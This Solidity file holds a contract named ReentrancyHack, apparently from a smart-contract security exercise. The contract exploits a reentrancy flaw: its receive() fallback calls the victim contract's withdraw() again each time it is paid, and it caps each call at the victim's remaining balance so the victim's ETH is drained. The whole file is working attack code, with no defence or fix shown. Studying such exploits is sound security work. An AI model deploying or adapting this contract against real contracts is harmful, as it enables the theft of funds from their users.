//SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

/*
    The reentrancy hack contract should call the withdraw() method as many times until it's depleted.
    The victim contract transfers the ETH to the hacker contract, which in turn calls withdraw() again from the fallback function.
*/

interface IReentrancy {
      function withdraw(uint _amount) external;
}

contract ReentrancyHack {

    IReentrancy victim;

    constructor(IReentrancy _victim) public {
        victim = _victim;
    }

    function withdrawAndHack(uint256 amount) external {
        victim.withdraw(amount);
    }

    receive() external payable {
        if (address(victim).balance > msg.value) {
            victim.withdraw(msg.value);
        } else if (address(victim).balance < msg.value && address(victim).balance > 0) {
            victim.withdraw(address(victim).balance);
        }
    }
}